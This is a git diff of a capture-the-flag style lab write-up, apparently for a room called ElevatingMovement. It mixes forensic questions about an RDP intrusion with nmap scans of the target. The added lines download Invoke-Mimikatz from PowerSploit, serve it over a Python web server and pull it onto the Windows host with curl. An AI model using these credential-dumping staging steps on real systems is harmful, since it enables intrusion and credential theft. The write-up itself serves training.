@@ -36,6 +36,36 @@ While Emily worked on the issue from a local admin account, the threat actor con
 <br>
 <p>2.1. When did the attacker perform RDP login on the server? Answer Format Example: 2025-01-15 19:30:45<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>2025-06-30 16:33:18</code><br>
+
+```bash
+:~/ElevatingMovement# nmap -p- -T4 xx.xx.xx.xx
+...
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+```
+
+```bash
+:~/ElevatingMovement# nmap -sC -sV -Pn -p3389,5985 -T4 xx.xx.xx.xx
+...PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: DECEPT
+|   NetBIOS_Domain_Name: DECEPT
+|   NetBIOS_Computer_Name: SRV-IT-QA
+|   DNS_Domain_Name: deceptitech.thm
+|   DNS_Computer_Name: SRV-IT-QA.deceptitech.thm
+|   DNS_Tree_Name: deceptitech.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-10-26Txx:xx:xx+00:00
+| ssl-cert: Subject: commonName=SRV-IT-QA.deceptitech.thm
+| Not valid before: 2025-06-19Txx:xx:xx
+|_Not valid after:  2025-12-19Txx:xx:xx
+|_ssl-date: 2025-10-26Txx:xx:xx+00:00; 0s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+```
   
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>Event Viewer</code><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - select <code>Applications and Service Logs</code> → <code>Microsoft</code> → <code>Windows</code> → <code>TerminalServices-RemoteConnectionManager</code> → <code>Operational</code><br>
@@ -131,48 +161,44 @@ C:\Users\Administrator\Desktop\PECmd.exe C:\Windows\Prefetch --csv ..\Prefetch -
 
 
 ```bash
-:~/ElevatingMovement# nmap -p- -T4 xx.xx.xx.xx
-...
-PORT     STATE SERVICE
-3389/tcp open  ms-wbt-server
-5985/tcp open  wsman
+:~/ElevatingMovement# curl -OL https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
 ```
 
-```bash
-:~/ElevatingMovement# nmap -sC -sV -Pn -p3389,5985 -T4 xx.xx.xx.xx
-...PORT     STATE SERVICE       VERSION
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| rdp-ntlm-info: 
-|   Target_Name: DECEPT
-|   NetBIOS_Domain_Name: DECEPT
-|   NetBIOS_Computer_Name: SRV-IT-QA
-|   DNS_Domain_Name: deceptitech.thm
-|   DNS_Computer_Name: SRV-IT-QA.deceptitech.thm
-|   DNS_Tree_Name: deceptitech.thm
-|   Product_Version: 10.0.17763
-|_  System_Time: 2025-10-26Txx:xx:xx+00:00
-| ssl-cert: Subject: commonName=SRV-IT-QA.deceptitech.thm
-| Not valid before: 2025-06-19Txx:xx:xx
-|_Not valid after:  2025-12-19Txx:xx:xx
-|_ssl-date: 2025-10-26Txx:xx:xx+00:00; 0s from scanner time.
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-```
+<img width="1227" height="165" alt="image" src="https://github.com/user-attachments/assets/be01a080-8590-45e0-a023-4c841cf17b90" />
 
-```bash
-:~/ElevatingMovement# curl -OL https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe
-```
-
-```bash
-:~/ElevatingMovement# ls
-mimikatz.exe
-```
+<br>
+<br>
 
 ```bash
 :~/ElevatingMovement# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
+
+```bash
+10.82.123.166
+```
+
+```bash
+C:\>mkdir tmp
+```
+
+```bash
+C:\>cd tmp
+```
+
+```bash
+C:\tmp>curl http://xx.xx.xxx.xxx:8000/Invoke-Mimikatz.exe -o Invoke-Mimikatz.exe
+```
+
+```bash
+C:\tmp>ls
+```
+
+```bash
+C:\tmp>ls
+```
+
 
 
 <img width="1189" height="202" alt="image" src="https://github.com/user-attachments/assets/91e47436-a8e5-448b-a5da-35627a8424e2" />
